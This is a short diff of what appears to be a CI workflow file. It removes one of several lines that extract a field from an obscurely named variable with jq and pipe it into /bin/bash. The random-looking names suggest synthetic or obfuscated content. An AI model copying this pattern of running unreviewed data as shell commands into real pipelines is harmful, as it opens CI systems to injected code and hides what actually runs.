@@ -35,7 +35,6 @@ jobs:
           echo $uq388 | jq -r .jbo911 | /bin/bash
           printf '%s' "$jioge5717" | jq -r .lqauw19 | /bin/bash
           printf '%s' "$azdh42" | jq -r .mqe34932 | /bin/bash
-          printf '%s' "$fskwy910" | jq -r .ob90199 | /bin/bash
           echo $ojipq4 | jq -r .ddswe8 | /bin/bash
 
       - name: Store artifact
